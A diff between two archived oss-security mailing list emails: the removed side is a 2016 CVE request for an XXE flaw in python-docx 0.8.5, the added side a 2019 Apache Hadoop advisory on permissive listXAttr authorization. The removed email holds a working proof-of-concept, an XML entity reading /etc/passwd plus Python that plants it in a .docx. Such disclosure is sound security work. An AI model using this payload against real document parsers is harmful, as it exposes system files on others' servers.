@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2701" "Tuesday" "28" "June" "2016" "17:31:22" "-0400" "Pierre Ernst" "pernst@salesforce.com" "<CAO8=cJ9uNJNtPb-GVqq168h4ODCkaxS6W+bX2DFMtpty-MJh2g@mail.gmail.com>" "100" "[oss-security] CVE request - python-docx 0.8.5 - XXE" nil nil nil "6" "2016062821:31:22" "[oss-security] CVE request - python-docx 0.8.5 - XXE" (number mark "U       pernst@sales Jun 28  100/2701  " thread-indent "\"[oss-security] CVE request - python-docx 0.8.5 - XXE\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["750" "Thursday" "24" "January" "2019" "13:34:21" "+0900" "Akira Ajisaka" "aajisaka@apache.org" "<CAP+3qq7v782VBmeatJTNV5L_wDk1dHsoWFNChAUUvsN7z2Tu1Q@mail.gmail.com>" "22" "[oss-security] CVE-2018-1296: Apache Hadoop HDFS Permissive listXAttr Authorization" nil nil nil "1" "2019012404:34:21" "[oss-security] CVE-2018-1296: Apache Hadoop HDFS Permissive listXAttr Authorization" (number mark "U       aajisaka@apa Jan 24   22/750   " thread-indent "\"[oss-security] CVE-2018-1296: Apache Hadoop HDFS Permissive listXAttr Authorization\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 5913 invoked by uid 550); 28 Jun 2016 22:04:20 -0000
+Received: (qmail 32116 invoked by uid 550); 24 Jan 2019 07:31:23 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,132 +12,41 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 20266 invoked from network); 28 Jun 2016 21:31:35 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=salesforce.com; s=google;
-        h=mime-version:from:date:message-id:subject:to;
-        bh=w9dLQml9ieudd7hRg1qrrh8kjyTaAL/IQ3h50FRNehs=;
-        b=eQbP+3/rlb93k+30sXIGxfJGlE94Z2pB1oRlHryk8siAjWU6iyxEp6OJYxP4VdT+Q1
-         VTM2GLVSP4uOaZJPrPUpyt3+0n8VxED/TEyBATB+OXWNMVLEu4RszQuBcWJb0/rVbIN0
-         IKB1WUEGspihft1clfoOaNXl9uv/CmKyf4Zwg=
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20130820;
-        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
-        bh=w9dLQml9ieudd7hRg1qrrh8kjyTaAL/IQ3h50FRNehs=;
-        b=SRXDtpYcQGwBNkG3UcDm8lJE0Zo/1x7NVys9ueFb8fnXMYdlWKEgDOjYRyh5yAd8rb
-         XWXfHOPTsrfShZR0PPFVoTfTOl4Jxgr3hV/vg6WWdU9RF1kgQQ/GoaAUEKQ/tWa2moos
-         FSWUXZQ8F2BOnYO9tcmHybwjddn5AmQb1wBbJk+uyuwZjIN6Tyci/dzAurSD9OLY1Ut2
-         ZXHCmJAE3FUYtYzWj5asjevloSy1ptaBITuJd8MnLqu58VFLioKSoZMQFLHE6eEw3uCT
-         CyRxM/NlOqwfPpLOPLL2UlVb/F0qQSoXPfXAkyVRnvkIrgiELOJfv3k7FyX3FnSlqP4D
-         /Fgw==
-X-Gm-Message-State: ALyK8tI3+dIvQ6oasBh2BTtXGcy8r8Z0ow7AjQUksuOdDQXr9M6qxGdMjehbrdi/lumlvG0ASCtA96kJL76Evv+V
-X-Received: by 10.157.35.111 with SMTP id k44mr3612542otd.18.1467149482588;
- Tue, 28 Jun 2016 14:31:22 -0700 (PDT)
+Received: (qmail 32147 invoked from network); 24 Jan 2019 04:34:48 -0000
+X-Gm-Message-State: AJcUukftGZvthUZxxNMN4aOH88CPWkrlwVUGHZzqgw8xKyJ6BDgIFQ3b
+	/Jdg6CUCrVYAe+XByHC1R6/tWIqpuEf7Ts8EEls=
+X-Google-Smtp-Source: ALg8bN4r/s1z6u7rwzoUZ9K1XH2kvMJUO9ZH4+GBUGMFZ+SB5/qYNY8sdlf4SR3+3or9IgGtn6uW00LNm4OxqgQ/nPo=
+X-Received: by 2002:a19:9b50:: with SMTP id d77mr3833064lfe.137.1548304472884;
+ Wed, 23 Jan 2019 20:34:32 -0800 (PST)
 MIME-Version: 1.0
-From: Pierre Ernst <pernst@salesforce.com>
-Date: Tue, 28 Jun 2016 17:31:22 -0400
-Message-ID: <CAO8=cJ9uNJNtPb-GVqq168h4ODCkaxS6W+bX2DFMtpty-MJh2g@mail.gmail.com>
-To: oss-security@lists.openwall.com
-Content-Type: text/plain; charset=UTF-8
-Subject: [oss-security] CVE request - python-docx 0.8.5 - XXE
+From: Akira Ajisaka <aajisaka@apache.org>
+Date: Thu, 24 Jan 2019 13:34:21 +0900
+X-Gmail-Original-Message-ID: <CAP+3qq7v782VBmeatJTNV5L_wDk1dHsoWFNChAUUvsN7z2Tu1Q@mail.gmail.com>
+Message-ID: <CAP+3qq7v782VBmeatJTNV5L_wDk1dHsoWFNChAUUvsN7z2Tu1Q@mail.gmail.com>
+To: general@hadoop.apache.org, user@hadoop.apache.org, 
+	"<security@hadoop.apache.org>" <security@hadoop.apache.org>, oss-security@lists.openwall.com
+Content-Type: text/plain; charset="UTF-8"
+Subject: [oss-security] CVE-2018-1296: Apache Hadoop HDFS Permissive listXAttr Authorization
 
-The python-docx package
-(https://github.com/python-openxml/python-docx) is vulnerable to XML
-External Entity attacks (XXE).
+CVE-2018-1296: Apache Hadoop HDFS Permissive listXAttr Authorization
 
-Version 0.8.6 (https://github.com/python-openxml/python-docx/releases/tag/v0.8.6)
-contains a fix.
+Severity: Important
 
-I would like to thanks Steve Canny for the prompt response.
+Vendor: The Apache Software Foundation
 
-The following POC has been tested on version 0.8.5.
+Versions Affected:
+3.0.0-alpha1 to 3.0.0, 2.9.0, 2.8.0 to 2.8.3, 2.5.0 to 2.7.5
 
-Older versions of the package might be vulnerable as well.
+Description:
+HDFS exposes extended attribute key/value pairs during listXAttrs,
+verifying only path-level search access to the directory rather than
+path-level read permission to the referent. This affects features that
+store sensitive data in extended attributes, such as HDFS encryption secrets.
 
+Mitigation:
+If a file contains sensitive data in extended attributes, users and admins
+need to change the permission to prevent others from listing the directory
+which contains the file.
 
-import docx
-import zipfile
-import tempfile
-import os
-
-# define malicious XML
-xml_string = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-<!DOCTYPE w:document [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
-]>
-<w:document xmlns:o="urn:schemas-microsoft-com:office:office"
-xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
-xmlns:v="urn:schemas-microsoft-com:vml"
-xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
-xmlns:w10="urn:schemas-microsoft-com:office:word"
-xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing">
-<w:body>
-<w:p>
-<w:pPr>
-<w:pStyle w:val="Normal" />
-<w:rPr></w:rPr>
-</w:pPr>
-<w:r>
-<w:rPr></w:rPr>
-<w:t>
-Pierre Ernst, Salesforce --[&xxe;]--
-</w:t>
-</w:r>
-</w:p>
-<w:p>
-<w:pPr>
-<w:pStyle w:val="Normal" />
-<w:rPr></w:rPr>
-</w:pPr>
-<w:r>
-<w:rPr></w:rPr>
-<w:t></w:t>
-</w:r>
-</w:p>
-<w:sectPr>
-<w:type w:val="nextPage" />
-<w:pgSz w:w="12240" w:h="15840" />
-<w:pgMar w:left="1134" w:right="1134" w:header="0" w:top="1134"
-w:footer="0" w:bottom="1134" w:gutter="0" />
-<w:pgNumType w:fmt="decimal" />
-<w:formProt w:val="false" />
-<w:textDirection w:val="lrTb" />
-</w:sectPr>
-</w:body>
-</w:document>'''
-
-# source: http://stackoverflow.com/questions/25738523/how-to-update-one-file-inside-zip-file-using-python
-def updateZip(zipname, filename, data):
-    # generate a temp file
-    tmpfd, tmpname = tempfile.mkstemp(dir=os.path.dirname(zipname))
-    os.close(tmpfd)
-
-    # create a temp copy of the archive without filename
-    with zipfile.ZipFile(zipname, 'r') as zin:
-        with zipfile.ZipFile(tmpname, 'w') as zout:
-            for item in zin.infolist():
-                if item.filename != filename:
-                    zout.writestr(item, zin.read(item.filename))
-
-    # replace with the temp archive
-    os.remove(zipname)
-    os.rename(tmpname, zipname)
-
-    # now add filename with its new data
-    with zipfile.ZipFile(zipname, mode='a',
-compression=zipfile.ZIP_DEFLATED) as zf:
-        zf.writestr(filename, data)
-
-# update legit docx file with malicious XML
-updateZip('whatever.docx', 'word/document.xml', xml_string)
-
-# process with python-docx
-document = docx.Document('whatever.docx')
-print '\n\n'.join([paragraph.text for paragraph in document.paragraphs])
-
-
-
-
--- 
-Pierre Ernst
-Salesforce
+Credit:
+This issue was discovered by Rushabh Shah.
